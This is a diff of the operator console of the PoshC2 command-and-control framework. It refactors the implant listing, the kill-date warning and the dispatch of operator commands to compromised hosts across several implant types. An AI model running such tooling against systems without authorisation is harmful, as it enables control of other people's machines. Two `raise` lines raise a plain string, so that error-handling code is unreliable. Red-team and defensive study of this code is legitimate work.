@@ -1,877 +1,1747 @@
-import sys
-import os
-import subprocess
-import traceback
-import signal
 import argparse
+import os
 import re
-
+import signal
+import subprocess
+import sys
+import traceback
 from datetime import datetime, timedelta, date, timezone
 
 from prompt_toolkit import PromptSession
-from prompt_toolkit.history import FileHistory
 from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
+from prompt_toolkit.history import FileHistory
 from prompt_toolkit.styles import Style
+from rich.console import Console
+from rich.table import Table
+from tzlocal import get_localzone
 
-from poshc2.client.Help import SERVER_COMMANDS, PY_COMMANDS, SHARP_COMMANDS, POSH_COMMANDS, JXA_COMMANDS, LINUX_COMMANDS, server_help
-from poshc2.Colours import Colours
-from poshc2.server.Config import PayloadsDirectory, PoshProjectDirectory, ReportsDirectory, ModulesDirectory, Database, DatabaseType
-from poshc2.server.Config import PBindPipeName, PBindSecret, PayloadCommsHost, DomainFrontHeader, FCommFileName, UserAgent
-from poshc2.server.Core import get_creds_from_params, print_good, print_bad, number_of_days
-from poshc2.client.reporting.HTML import generate_html_table, graphviz
+from poshc2 import Colours
+from poshc2.Utils import no_yes_prompt, validate_timestamp_string, command, get_command_word
+from poshc2.Utils import validate_sleep_time, parse_creds, validate_kill_date, string_to_array, get_first_url
+from poshc2.client.cli.AutosuggestionAggregator import AutosuggestionAggregator
+from poshc2.client.cli.CommandPromptCompleter import FirstWordCompleter
+from poshc2.client.cli.PoshExamplesAutosuggestions import AutoSuggestFromPoshExamples
+from poshc2.client.command_handlers.FCommHandler import handle_fcomm_command, fc_prompt
+from poshc2.client.command_handlers.JxaHandler import handle_jxa_command, jxa_prompt
+from poshc2.client.command_handlers.LinuxHandler import handle_linux_command, nl_prompt
+from poshc2.client.command_handlers.PBindHandler import handle_pbind_command, pb_prompt
+from poshc2.client.command_handlers.PSHandler import handle_ps_command, ps_prompt
+from poshc2.client.command_handlers.PyHandler import handle_py_command, py_prompt
+from poshc2.client.command_handlers.SharpHandler import handle_sharp_command, cs_prompt
 from poshc2.client.reporting.CSV import generate_csv
+from poshc2.client.reporting.HTML import graphviz, generate_html_table
+from poshc2.server.Config import PBindPipeName, PBindSecret, FCommFilePath, UserAgent, ReportsDirectory
+from poshc2.server.Config import PayloadsDirectory, PoshProjectDirectory, ModulesDirectory, Database, DatabaseType
+from poshc2.server.Core import get_cred_from_params, print_good, print_bad, number_of_days, clear, get_parent_implant
+from poshc2.server.ImplantType import ImplantType
+from poshc2.server.PowerStatus import get_powerstatus_label
+from poshc2.server.database.Helpers import get_mitre_ttps, get_alive_implants, get_implant, get_implant_by_numeric_id, \
+    get_creds, get_new_implant_url
+from poshc2.server.database.Helpers import insert_object, update_object, delete_object, select_first, select_all
+from poshc2.server.database.Model import C2Server, C2Message, NewTask, Task, Cred, Implant, URL, OpsecEntry, HostedFile, \
+    AutoRun, MitreTTP
 from poshc2.server.payloads.Payloads import Payloads
-from poshc2.Utils import validate_sleep_time, randomuri, parse_creds, validate_killdate, string_to_array, get_first_url, no_yes_prompt, yes_no_prompt, validate_timestamp_string
-from poshc2.client.command_handlers.JxaHandler import handle_jxa_command
-from poshc2.client.command_handlers.LinuxHandler import handle_linux_command
-from poshc2.client.command_handlers.PyHandler import handle_py_command
-from poshc2.client.command_handlers.SharpHandler import handle_sharp_command
-from poshc2.client.command_handlers.PSHandler import handle_ps_command
-from poshc2.client.command_handlers.PbindHandler import handle_pbind_command
-from poshc2.client.command_handlers.PbindPivotHandler import handle_pbind_pivot_command
-from poshc2.client.command_handlers.FCommHandler import handle_fcomm_command
-from poshc2.client.cli.CommandPromptCompleter import FirstWordFuzzyWordCompleter
-from poshc2.client.Help import banner
-from poshc2.server.database.DBType import DBType
-from poshc2.server.database.DB import update_item, get_c2server_all, get_implants_all, get_tasks, get_implantdetails, new_urldetails, database_connect
-from poshc2.server.database.DB import get_newimplanturl, get_implantbyid, get_implants, new_c2_message, update_label, new_task, hide_implant, unhide_implant
-from poshc2.server.database.DB import get_c2urls, del_autorun, del_autoruns, add_autorun, get_autorun, get_newtasks_all
-from poshc2.server.database.DB import drop_newtasks, get_implanttype, get_randomuri, get_creds, get_creds_for_user, insert_cred
-from poshc2.server.database.DB import get_hosted_files, insert_hosted_file, del_hosted_file, enable_hosted_file, select_item, del_newtasks
-from poshc2.server.database.DB import insert_opsec_event, del_opsec_event, get_opsec_events, get_powerstatusbyrandomuri
 
 utcTimezone = timezone(timedelta(hours=0))
+local_zone = get_localzone()
+
+server_commands = {}
+server_commands_help = {}
+server_examples = []
+server_block_help = {}
+
+serverAutosuggestor = AutoSuggestFromPoshExamples(server_examples)
+
+style = Style.from_dict({
+    '': '#32CD32',
+})
 
 
 def catch_exit(signum, frame):
     sys.exit(0)
 
 
-def get_implant_type_prompt_prefix(implant_id):
-    if "," in str(implant_id):
+def get_implant_type_prompt_prefix(numeric_id):
+    if "," in str(numeric_id):
         return ""
-    implant = get_implantbyid(implant_id)
-    pivot = implant.Pivot
-    pivot_original = pivot
-    if pivot_original.startswith("PS"):
-        pivot = "PS"
-    elif pivot_original.startswith("C#"):
-        pivot = "C#"
-    elif pivot_original.startswith("Python"):
-        pivot = "PY"
-    elif pivot_original.startswith("JXA"):
-        pivot = "JXA"
-    elif pivot_original.startswith("NativeLinux"):
-        pivot = "NL"
-    if "Daisy" in pivot_original:
-        pivot = pivot + ";D"
-    if "Proxy" in pivot_original:
-        pivot = pivot + ";P"
-    if "PBind" in pivot_original:
-        pivot = pivot + ";PB"
-    if "FComm" in pivot_original:
-        pivot = pivot + ";FC"
-    return pivot
+
+    implant = get_implant_by_numeric_id(numeric_id)
+    implant_type = ImplantType.get(implant.type)
+    return implant_type.value
 
 
-def implant_handler_command_loop(user, printhelp="", autohide=None):
-    while(True):
-        session = PromptSession(history=FileHistory('%s/.top-history' % PoshProjectDirectory), auto_suggest=AutoSuggestFromHistory())
+def show_implants_table(implants, auto_hide):
+    table = Table(title="Implants", pad_edge=True, show_edge=True, collapse_padding=True, padding=0)
+    table.add_column("ID", no_wrap=True, min_width=5, justify="center")
+    table.add_column("Last Seen (UTC)", no_wrap=True, min_width=16, justify="center")
+    table.add_column("Process Name", no_wrap=True, justify="center")
+    table.add_column("PID", no_wrap=True, justify="center")
+    table.add_column("Sleep", no_wrap=True, width=7, justify="center")
+    table.add_column("Comms ID", no_wrap=True, justify="center")
+    table.add_column("Context", no_wrap=True, min_width=20, justify="center")
+    table.add_column("Arch", no_wrap=True, justify="center")
+    table.add_column("Type", no_wrap=True, min_width=6, justify="center")
+    table.add_column("Label", no_wrap=True, min_width=13, justify="center")
+
+    for implant in implants:
+        implant_type = ImplantType.get(implant.type)
+        implant_label = implant.label
+        powerstatus_label = get_powerstatus_label(implant)
+
+        if powerstatus_label:
+            implant_label += powerstatus_label
+
+        if implant_type.is_pbind_implant() or implant_type.is_fcomm_implant():
+            sleep_implant = get_parent_implant(implant.id)
+            if sleep_implant is None:
+                sleep_implant = implant
+        else:
+            sleep_implant = implant
+
+        utc_timezone = timezone(timedelta(hours=0))
+        last_seen_time = datetime.strptime(sleep_implant.last_seen, "%Y-%m-%d %H:%M:%S")
+        last_seen_time = last_seen_time.replace(tzinfo=utc_timezone)
+        last_seen_time_string = last_seen_time.strftime("%Y-%m-%d %H:%M:%S")
+        utc_now = datetime.now(tz=utc_timezone)
+
+        if sleep_implant.sleep.endswith('s'):
+            sleep_int = int(sleep_implant.sleep[:-1])
+        elif sleep_implant.sleep.endswith('m'):
+            sleep_int = int(sleep_implant.sleep[:-1]) * 60
+        elif sleep_implant.sleep.endswith('h'):
+            sleep_int = int(sleep_implant.sleep[:-1]) * 60 * 60
+        else:
+            print(Colours.RED)
+            print(f"Incorrect sleep format: {sleep_implant.sleep}")
+            print(Colours.GREEN)
+            continue
+
+        now_minus_3_beacons = utc_now - timedelta(seconds=(sleep_int * 3))
+        now_minus_10_beacons = utc_now - timedelta(seconds=(sleep_int * 10))
+        now_minus_30_beacons = utc_now - timedelta(seconds=(sleep_int * 30))
+        id_string = str(implant.numeric_id)
+
+        if not implant_label:
+            implant_label = ""
+        else:
+            implant_label = implant_label.strip()
+            implant_label = f"[blue][{implant_label}][/blue]"
+
+        context = f"{implant.domain}\\{implant.user} @ {implant.hostname}"
+
+        if "*" in context or "#" in context:
+            context = f"[green]{context}[/green]"
+
+        architecture = implant.architecture
+
+        if implant_type.is_pbind_implant():
+            comms = f"[blue]PBind[/blue]"
+        elif implant_type.is_fcomm_implant():
+            comms = f"[purple]FComm[/purple]"
+        else:
+            comms = str(implant.url_id)
+
+        if implant_type.is_pbind_implant() or implant_type.is_fcomm_implant():
+            table.add_row(id_string, last_seen_time_string, implant.process_name, str(implant.process_id),
+                          implant.sleep, comms, context, architecture, implant_type.value,
+                          implant_label)
+        elif now_minus_30_beacons > last_seen_time and auto_hide:
+            pass
+        elif now_minus_10_beacons > last_seen_time:
+            table.add_row(id_string, f"[bold red]{last_seen_time_string}[/bold red]", implant.process_name,
+                          str(implant.process_id), implant.sleep,
+                          comms, context, architecture, implant_type.value, implant_label)
+        elif now_minus_3_beacons > last_seen_time:
+            table.add_row(id_string, f"[bold yellow]{last_seen_time_string}[/bold yellow]", implant.process_name,
+                          str(implant.process_id), implant.sleep,
+                          comms, context, architecture, implant_type.value, implant_label)
+        else:
+            table.add_row(id_string, last_seen_time_string, implant.process_name, str(implant.process_id),
+                          implant.sleep, comms,
+                          context, architecture, implant_type.value, implant_label)
+
+    if table.row_count > 0:
+        console = Console()
+        print(Colours.END)
+        console.print(table)
+        return True
+    return False
+
+
+def implant_handler_command_loop(user, help_text="", auto_hide=None):
+    while True:
+        session = PromptSession(history=FileHistory(f'{PoshProjectDirectory}/.server-history'),
+                                auto_suggest=AutosuggestionAggregator([AutoSuggestFromHistory(), serverAutosuggestor]))
 
         try:
             if user is not None:
-                print("User: " + Colours.BLUE + "%s%s" % (user, Colours.GREEN))
+                print(f"User: {Colours.BLUE}{user}{Colours.GREEN}")
+
+            c2_server = select_first(C2Server)
+            kill_date = datetime.strptime(c2_server.kill_date, '%Y-%m-%d').date()
+            date_difference = number_of_days(date.today(), kill_date)
+
+            if date_difference < 8:
+                print(
+                    Colours.RED + f"\nKill Date is - {c2_server.kill_date} - expires in {date_difference} days" + Colours.END)
                 print()
 
-            C2 = get_c2server_all()
-            killdate = datetime.strptime(C2.KillDate, '%Y-%m-%d').date()
-            datedifference = number_of_days(date.today(), killdate)
-            if datedifference < 8:
-                print(Colours.RED + ("\nKill Date is - %s - expires in %s days" % (C2.KillDate, datedifference)))
-                print(Colours.END)
-                print()
+            implants = get_alive_implants()
 
-            implants = get_implants()
             if implants:
-                for implant in implants:
-                    ID = implant.ImplantID
-                    LastSeen = implant.LastSeen
-                    Hostname = implant.Hostname
-                    Domain = implant.Domain
-                    URLID = implant.URLID
-                    DomainUser = implant.User
-                    Arch = implant.Arch
-                    PID = implant.PID
-                    ProcName = implant.ProcName
-                    Sleep = implant.Sleep.strip()
-                    Label = implant.Label
-
-                    apmsuspendshut = False
-
-                    pwrStatus = get_powerstatusbyrandomuri(implant.RandomURI)
-                    if pwrStatus is not None:
-                        if Label is not None:
-                            Label += " "
-                        else:
-                            Label = ""
-                        apmstatus = pwrStatus[2].lower()
-
-                        if (apmstatus == "shutdown"):
-                            Label += "SHTDWN "
-                            apmsuspendshut = True
-                        elif (apmstatus == "suspend" or apmstatus == "querysuspend"):
-                            Label += "SUSPND "
-                            apmsuspendshut = True
-
-                        if not apmsuspendshut:
-                            if (pwrStatus[7]):
-                                Label += "LOCKED "
-                            if (not pwrStatus[8]):
-                                Label += "SCRN OFF "
-
-                            if (not pwrStatus[3]):
-                                if (pwrStatus[6] is not None and pwrStatus[6].isdigit()):
-                                    Label += ("DSCHRG: %s%% " % pwrStatus[6])
-                                else:
-                                    Label += ("DSCHRG ")
-
-                    Pivot = get_implant_type_prompt_prefix(ID)
-                    LastSeenTime = datetime.strptime(LastSeen, "%Y-%m-%d %H:%M:%S")
-                    LastSeenTime = LastSeenTime.replace(tzinfo=utcTimezone)
-                    now = datetime.now(timezone.utc)
-                    sleep_int = sleepint(Sleep)
-                    if sleep_int == "error":
-                        print(Colours.RED)
-                        print("Incorrect sleep format: %s" % Sleep)
-                        print(Colours.GREEN)
-                        continue
-                    nowMinus3Beacons = now - timedelta(seconds=(sleep_int * 3))
-                    nowMinus10Beacons = now - timedelta(seconds=(sleep_int * 10))
-                    nowMinus30Beacons = now - timedelta(seconds=(sleep_int * 30))
-                    sID = "[" + str(ID) + "]"
-                    if not Label:
-                        sLabel = ""
-                    else:
-                        Label = Label.strip()
-                        sLabel = Colours.BLUE + "[" + Label + "]" + Colours.GREEN
-
-                    if "C#;PB" in Pivot:
-                        print(Colours.BLUE + "%s: %s | %s (%s) | %s | PBind | %s\\%s @ %s (%s) %s %s" % (sID.ljust(4), LastSeenTime, ProcName, PID.ljust(5), Sleep, Domain, DomainUser, Hostname, Arch, Pivot, sLabel))
-                    elif "C#;FC" in Pivot:
-                        print(Colours.PURPLE + "%s: %s | %s (%s) | %s | FComm | %s\\%s @ %s (%s) %s %s" % (sID.ljust(4), LastSeenTime, ProcName, PID.ljust(5), Sleep, Domain, DomainUser, Hostname, Arch, Pivot, sLabel))
-                    elif nowMinus30Beacons > LastSeenTime and autohide:
-                        pass
-                    elif nowMinus10Beacons > LastSeenTime:
-                        print(Colours.RED + "%s: %s | %s (%s) | %s | %s | %s\\%s @ %s (%s) %s %s" % (sID.ljust(4), LastSeenTime, ProcName, PID.ljust(5), Sleep, URLID, Domain, DomainUser, Hostname, Arch, Pivot, sLabel))
-                    elif nowMinus3Beacons > LastSeenTime:
-                        print(Colours.YELLOW + "%s: %s | %s (%s) | %s | %s | %s\\%s @ %s (%s) %s %s" % (sID.ljust(4), LastSeenTime, ProcName, PID.ljust(5), Sleep, URLID, Domain, DomainUser, Hostname, Arch, Pivot, sLabel))
-                    else:
-                        print(Colours.GREEN + "%s: %s | %s (%s) | %s | %s | %s\\%s @ %s (%s) %s %s" % (sID.ljust(4), LastSeenTime, ProcName, PID.ljust(5), Sleep, URLID, Domain, DomainUser, Hostname, Arch, Pivot, sLabel))
+                no_implants = not show_implants_table(implants, auto_hide)
             else:
-                now = datetime.now(timezone.utc)
-                print(Colours.RED + "No Implants as of: %s" % now.strftime("%Y-%m-%d %H:%M:%S"))
+                no_implants = True
 
-            if printhelp:
-                print(printhelp)
+            if no_implants:
+                utc_now = datetime.now(timezone.utc)
+                print(Colours.RED + f"\nNo Implants as of: {utc_now.strftime('%Y-%m-%d %H:%M:%S')}")
 
-            command = session.prompt("\nSelect ImplantID or ALL or Comma Separated List (Enter to refresh):: ", completer=FirstWordFuzzyWordCompleter(SERVER_COMMANDS, WORD=True))
+            if help_text:
+                print(help_text)
+
+            completions = list(server_commands.keys())
+            completions.extend(server_examples)
+            command = session.prompt("\n> Select Implant ID(s) or 'all' (Enter to refresh):: ",
+                                     completer=FirstWordCompleter(completions, WORD=True))
             print("")
 
             command = command.strip()
-            if (command == "") or (command == "back") or (command == "clear"):
-                do_back(user, command)
-                continue
-            if command.startswith("generate-reports"):
-                do_generate_reports(user, command)
-                continue
-            if command.startswith("generate-csvs"):
-                do_generate_csvs(user, command)
-                continue
-            if command.startswith("message "):
-                do_message(user, command)
-                continue
-            if command.startswith("show-hosted-files"):
-                do_show_hosted_files(user, command)
-                continue
-            if command.startswith("add-hosted-file"):
-                do_add_hosted_file(user, command)
-                continue
-            if command.startswith("disable-hosted-file"):
-                do_disable_hosted_file(user, command)
-                continue
-            if command.startswith("enable-hosted-file"):
-                do_enable_hosted_file(user, command)
-                continue
-            if command.startswith("show-urls") or command.startswith("list-urls"):
-                do_show_urls(user, command)
-                continue
-            if command.startswith("add-autorun"):
-                do_add_autorun(user, command)
-                continue
-            if command.startswith("list-autorun"):
-                do_list_autoruns(user, command)
-                continue
-            if command.startswith("del-autorun"):
-                do_del_autorun(user, command)
-                continue
-            if command.startswith("nuke-autorun"):
-                do_nuke_autoruns(user, command)
-                continue
-            if command.startswith("kill"):
-                do_del_task(user, command)
-                continue
-            if command.startswith("show-serverinfo"):
-                do_show_serverinfo(user, command)
-                continue
-            if command.startswith("turnoff-notifications"):
-                do_turnoff_notifications(user, command)
-                continue
-            if command.startswith("turnon-notifications"):
-                do_turnon_notifications(user, command)
-                continue
-            if command.startswith("set-pushover-applicationtoken"):
-                do_set_pushover_applicationtoken(user, command)
-                continue
-            if command.startswith("set-pushover-userkeys"):
-                do_set_pushover_userkeys(user, command)
-                continue
-            if command.startswith("set-slack-userid"):
-                do_set_slack_userid(user, command)
-                continue
-            if command.startswith("set-slack-channel"):
-                do_set_slack_channel(user, command)
-                continue
-            if command.startswith("set-slack-bottoken"):
-                do_set_slack_bottoken(user, command)
-                continue
-            if command.startswith("get-killdate"):
-                do_get_killdate(user, command)
-                continue
-            if command.startswith("set-killdate"):
-                do_set_killdate(user, command)
-                continue
-            if command.startswith("set-defaultbeacon"):
-                do_set_defaultbeacon(user, command)
-                continue
-            if command == "get-opsec-events":
-                do_get_opsec_events(user, command)
-                continue
-            if command == "add-opsec-event":
-                do_insert_opsec_events(user, command)
-                continue
-            if command == "del-opsec-event":
-                do_del_opsec_events(user, command)
-                continue
-            if command.startswith("opsec"):
-                do_opsec(user, command)
-                continue
-            if command.startswith("listmodules"):
-                do_listmodules(user, command)
-                continue
-            if command.startswith('creds ') or command.strip() == "creds":
-                do_creds(user, command)
-                input("Press Enter to continue...")
+
+            if command == "" or command == "back":
                 clear()
                 continue
-            if (command == "pwnself") or (command == "p"):
-                do_pwnself(user, command)
-                continue
-            if command == "tasks":
-                do_tasks(user, command)
-                continue
-            if command == "cleartasks":
-                do_cleartasks(user, command)
-                continue
-            if command.startswith("quit"):
-                do_quit(user, command)
-                continue
-            if command.startswith("createdaisypayload"):
-                do_createdaisypayload(user, command)
-                continue
-            if command.startswith("createproxypayload"):
-                do_createnewpayload(user, command)
-                continue
-            if command.startswith("createnewpayload"):
-                do_createnewpayload(user, command)
-                continue
-            if command.startswith("createnewshellcode"):
-                do_createnewpayload(user, command, shellcodeOnly=True)
-                continue
-            if command.startswith("createpbindpayload"):
-                do_createnewpayload(user, command, pbindOnly=True)
-                continue
-            if command.startswith("createlinuxpayload"):
-                do_createnewpayload(user, command, linuxOnly=True)
-                continue
-            if command == "help":
-                do_help(user, command)
-                continue
-            if command == "history":
-                do_history(user, command)
-                continue
-            if command.startswith("hide-dead-implants"):
-                do_hide_dead_implants(user, command)
-                continue
-            if command.startswith("use "):
-                do_use(user, command)
-            implant_command_loop(command, user)
+
+            command_word = get_command_word(command)
+
+            if command_word in server_commands:
+                server_commands[command_word](user, command)
+            else:
+                implant_command_loop(command, user)
+
         except KeyboardInterrupt:
             clear()
             continue
         except EOFError:
-            new_c2_message("%s logged off." % user)
+            now = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
+            c2_message = C2Message(
+                message=f"\n{Colours.BLUE}{now}: {user} logged off.{Colours.END}\n",
+                read="No"
+            )
+
+            insert_object(c2_message)
             sys.exit(0)
         except Exception as e:
             if 'unable to open database file' not in str(e):
-                print_bad("Error: %s" % e)
-                traceback.print_exc()
+                print_bad(f"Error: {e}")
+                print(Colours.END)
+                # traceback.print_exc()
+                input("Press Enter to continue...")
+                clear()
 
 
-def run_implant_command(command, randomuri, implant_id, user):
+def run_implant_command(command, implant_id, user, handler_numeric_id):
+    implant = get_implant(implant_id)
+    implant_type = ImplantType.get(implant.type)
 
-    # Common Implant Commands
-    if command.startswith("creds ") or command.strip() == "creds":
-        do_creds(user, command)
+    if implant_type.is_python_implant():
+        handle_py_command(command, user, implant_id)
         return
-    elif command.startswith('label-implant'):
-        do_label_implant(user, command, randomuri)
+    elif implant_type.is_pbind_implant():
+        handle_pbind_command(command, user, implant_id, handler_numeric_id)
         return
-    elif command.startswith('remove-label'):
-        do_remove_label(user, command, randomuri)
+    elif implant_type.is_fcomm_implant():
+        handle_fcomm_command(command, user, implant_id, handler_numeric_id)
         return
-    if command.startswith("beacon"):
-        do_beacon(user, command, randomuri)
+    elif implant_type.is_sharp_implant():
+        handle_sharp_command(command, user, implant_id)
         return
-    elif command == "quit":
-        do_quit(user, command)
+    elif implant_type.is_jxa_implant():
+        handle_jxa_command(command, user, implant_id)
         return
-    elif command.startswith("unhide-implant"):
-        do_unhide_implant(user, command, randomuri)
+    elif implant_type.is_linux_implant():
+        handle_linux_command(command, user, implant_id)
         return
-    elif command.startswith("hide-implant"):
-        do_hide_implant(user, command, randomuri)
-        return
-    elif command == "back" or command == "clear":
-        do_back(user, command)
-        return
-    elif command.startswith("searchhistory"):
-        do_searchhistory(user, command, randomuri)
-        return
-
-    implant_type = get_implanttype(randomuri)
-    if implant_type.startswith("Python"):
-        handle_py_command(command, user, randomuri, implant_id)
-        return
-    elif implant_type.startswith("C# PBind Pivot"):
-        handle_pbind_pivot_command(command, user, randomuri, implant_id)
-        return
-    elif implant_type.startswith("C# PBind"):
-        handle_pbind_command(command, user, randomuri, implant_id)
-        return
-    elif implant_type.startswith("C# FComm"):
-        handle_fcomm_command(command, user, randomuri, implant_id)
-        return
-    elif implant_type.startswith("C#"):
-        handle_sharp_command(command, user, randomuri, implant_id)
-        return
-    elif implant_type.startswith("JXA"):
-        handle_jxa_command(command, user, randomuri, implant_id)
-        return
-    elif implant_type.startswith("NativeLinux"):
-        handle_linux_command(command, user, randomuri, implant_id)
+    elif implant_type.is_powershell_implant():
+        handle_ps_command(command, user, implant_id)
         return
     else:
-        handle_ps_command(command, user, randomuri, implant_id)
-        return
+        raise f"Unknown implant type: {implant_type}"
 
 
-def implant_command_loop(implant_id, user):
-    while(True):
+def implant_command_loop(numeric_id, user):
+    while True:
+        print()
+
         try:
-            style = Style.from_dict({
-                '': '#80d130',
-            })
-            session = PromptSession(history=FileHistory('%s/.implant-history' % PoshProjectDirectory), auto_suggest=AutoSuggestFromHistory(), style=style)
-            implant_id_orig = implant_id
-            if ("-" in implant_id) or ("all" in implant_id) or ("," in implant_id):
-                print(Colours.GREEN)
-                prompt_commands = SHARP_COMMANDS
-                command = session.prompt("%s> " % implant_id, completer=FirstWordFuzzyWordCompleter(prompt_commands, WORD=True))
-                if command == "back" or command == 'clear':
-                    do_back(user, command)
+            if ("-" in numeric_id) or ("all" in numeric_id) or ("," in numeric_id):
+                command = ps_prompt(numeric_id)
+
+                if command == "back":
+                    clear()
                     return
             else:
-                implant = get_implantbyid(implant_id)
+                implant = get_implant_by_numeric_id(numeric_id)
+
                 if not implant:
-                    print_bad("Unrecognised implant id or command: %s" % implant_id)
+                    print_bad(f"Unrecognised implant id or command: {numeric_id}")
+                    print(Colours.END)
                     input("Press Enter to continue...")
                     clear()
                     return
-                prompt_commands = POSH_COMMANDS
-                if implant.Pivot.startswith('Python'):
-                    prompt_commands = PY_COMMANDS
-                if implant.Pivot.startswith('JXA'):
-                    prompt_commands = JXA_COMMANDS
-                if implant.Pivot.startswith('NativeLinux'):
-                    prompt_commands = LINUX_COMMANDS
-                if implant.Pivot.startswith('C#'):
-                    prompt_commands = SHARP_COMMANDS
-                if 'PB' in implant.Pivot:
-                    style = Style.from_dict({
-                        '': '#008ECC',
-                    })
-                    session = PromptSession(history=FileHistory('%s/.implant-history' % PoshProjectDirectory), auto_suggest=AutoSuggestFromHistory(), style=style)
-                    prompt_commands = SHARP_COMMANDS
-                    print(Colours.BLUE)
-                if 'FC' in implant.Pivot:
-                    style = Style.from_dict({
-                        '': '#772953',
-                    })
-                    session = PromptSession(history=FileHistory('%s/.implant-history' % PoshProjectDirectory), auto_suggest=AutoSuggestFromHistory(), style=style)
-                    prompt_commands = SHARP_COMMANDS
-                    print(Colours.PURPLE)
+
+                print(
+                    f"{Colours.GREEN}{implant.domain}\\{implant.user} @ {implant.hostname} (PID:{implant.process_id}){Colours.END}")
+
+                # TODO refactor
+                prefix = f"{get_implant_type_prompt_prefix(numeric_id)} {numeric_id}"
+                implant_type = ImplantType.get(implant.type)
+
+                if implant_type.is_python_implant():
+                    command = py_prompt(prefix)
+                elif implant_type.is_pbind_implant():
+                    command = pb_prompt(prefix)
+                elif implant_type.is_fcomm_implant():
+                    command = fc_prompt(prefix)
+                elif implant_type.is_sharp_implant():
+                    command = cs_prompt(prefix)
+                elif implant_type.is_powershell_implant():
+                    command = ps_prompt(prefix)
+                elif implant_type.is_linux_implant():
+                    command = nl_prompt(prefix)
+                elif implant_type.is_jxa_implant():
+                    command = jxa_prompt(prefix)
                 else:
-                    print(Colours.GREEN)
-                print("%s\\%s @ %s (PID:%s - Process:%s)" % (implant.Domain, implant.User, implant.Hostname, implant.PID, implant.ProcName))
-                command = session.prompt("%s %s> " % (get_implant_type_prompt_prefix(implant_id), implant_id), completer=FirstWordFuzzyWordCompleter(prompt_commands, WORD=True))
-                if command == "back" or command == 'clear':
-                    do_back(user, command)
+                    raise f"Unrecognised implant type: {implant.type}"
+                if command == "back":
+                    clear()
                     return
 
             # if "all" run through all implants get_implants()
-            if implant_id == "all":
-                if command == "back" or command == 'clear':
-                    do_back(user, command)
+            if numeric_id == "all":
+                if command == "back":
+                    clear()
                     return
-                allcommands = command
+
+                all_commands = command
+                confirm = "n"
+
                 if "\n" in command:
-                    ri = input("Do you want to run commands separately? (Y/n) ")
-                implants_split = get_implants()
-                if implants_split:
-                    for implant_details in implants_split:
+                    confirm = input("Do you want to run commands separately? (Y/n) ")
+
+                implants = get_alive_implants()
+
+                if implants:
+                    for implant in implants:
                         # if "\n" in command run each command individually or ask the question if that's what they want to do
-                        if "\n" in allcommands:
-                            if ri.lower() == "y" or ri == "":
-                                commands = allcommands.split('\n')
+                        if "\n" in all_commands:
+                            if confirm.lower() == "y" or confirm == "":
+                                commands = all_commands.split('\n')
+
                                 for command in commands:
-                                    run_implant_command(command, implant_details.RandomURI, implant_id_orig, user)
+                                    run_implant_command(command, implant.id, user, implant.numeric_id)
                             else:
-                                run_implant_command(command, implant_details.RandomURI, implant_id_orig, user)
+                                run_implant_command(command, implant.id, user, implant.numeric_id)
                         else:
-                            run_implant_command(command, implant_details.RandomURI, implant_id_orig, user)
+                            run_implant_command(command, implant.id, user, implant.numeric_id)
 
             # if "separated list" against single uri
-            elif "," in implant_id:
-                allcommands = command
+            # TODO refactor
+            elif "," in numeric_id:
+                all_commands = command
+                confirm = "n"
+
                 if "\n" in command:
-                    ri = input("Do you want to run commands separately? (Y/n) ")
-                implant_split = implant_id.split(",")
+                    confirm = input("Do you want to run commands separately? (Y/n) ")
+
+                implant_split = numeric_id.split(",")
+
                 for split_implant_id in implant_split:
-                    implant_randomuri = get_randomuri(split_implant_id)
+                    implant = get_implant_by_numeric_id(split_implant_id)
+
                     # if "\n" in command run each command individually or ask the question if that's what they want to do
-                    if "\n" in allcommands:
-                        if ri.lower() == "y" or ri == "":
-                            commands = allcommands.split('\n')
+                    if "\n" in all_commands:
+                        if confirm.lower() == "y" or confirm == "":
+                            commands = all_commands.split('\n')
+
                             for command in commands:
-                                run_implant_command(command, implant_randomuri, implant_id_orig, user)
+                                run_implant_command(command, implant.id, user, split_implant_id)
                         else:
-                            run_implant_command(command, implant_randomuri, implant_id_orig, user)
+                            run_implant_command(command, implant.id, user, split_implant_id)
                     else:
-                        run_implant_command(command, implant_randomuri, implant_id_orig, user)
+                        run_implant_command(command, implant.id, user, split_implant_id)
 
             # if "range" against single uri
-            elif "-" in implant_id:
-                allcommands = command
-                if "\n" in command:
-                    ri = input("Do you want to run commands separately? (Y/n) ")
-                implant_split = implant_id.split("-")
-                for range_implant_id in range(int(implant_split[0]), int(implant_split[1]) + 1):
-                    try:
-                        implant_randomuri = get_randomuri(range_implant_id)
-                        # if "\n" in command run each command individually or ask the question if that's what they want to do
-                        if "\n" in allcommands:
-                            if ri.lower() == "y" or ri == "":
-                                commands = allcommands.split('\n')
-                                for command in commands:
-                                    run_implant_command(command, implant_randomuri, implant_id_orig, user)
-                            else:
-                                run_implant_command(command, implant_randomuri, implant_id_orig, user)
-                        else:
-                            run_implant_command(command, implant_randomuri, implant_id_orig, user)
-                    except Exception:
-                        print_bad("Unknown ImplantID")
+            elif "-" in numeric_id:
+                all_commands = command
+                confirm = "n"
 
-            # else run against single uri
-            else:
-                allcommands = command
                 if "\n" in command:
-                    ri = input("Do you want to run commands separately? (Y/n) ")
-                implant_randomuri = get_randomuri(implant_id)
+                    confirm = input("Do you want to run commands separately? (Y/n) ")
+
+                try:
+                    implant_split = numeric_id.split("-")
+
+                    for range_implant_id in range(int(implant_split[0]), int(implant_split[1]) + 1):
+                        implant = get_implant_by_numeric_id(range_implant_id)
+
+                        # if "\n" in command run each command individually or ask the question if that's what they want to do
+                        if "\n" in all_commands:
+                            if confirm.lower() == "y" or confirm == "":
+                                commands = all_commands.split('\n')
+
+                                for command in commands:
+                                    run_implant_command(command, implant.id, user, range_implant_id)
+                            else:
+                                run_implant_command(command, implant.id, user, range_implant_id)
+                        else:
+                            run_implant_command(command, implant.id, user, range_implant_id)
+                except Exception:
+                    traceback.print_exc()
+                    print_bad("Unknown Implant ID")
+
+            # else run against single id
+            else:
+                all_commands = command
+                confirm = "n"
+
+                if "\n" in command:
+                    confirm = input("Do you want to run commands separately? (Y/n) ")
+
+                implant = get_implant_by_numeric_id(numeric_id)
+
                 # if "\n" in command run each command individually or ask the question if that's what they want to do
-                if "\n" in allcommands:
-                    if ri.lower() == "y" or ri == "":
-                        commands = allcommands.split('\n')
+                if "\n" in all_commands:
+                    if confirm.lower() == "y" or confirm == "":
+                        commands = all_commands.split('\n')
+
                         for command in commands:
-                            run_implant_command(command, implant_randomuri, implant_id_orig, user)
+                            run_implant_command(command, implant.id, user, numeric_id)
                     else:
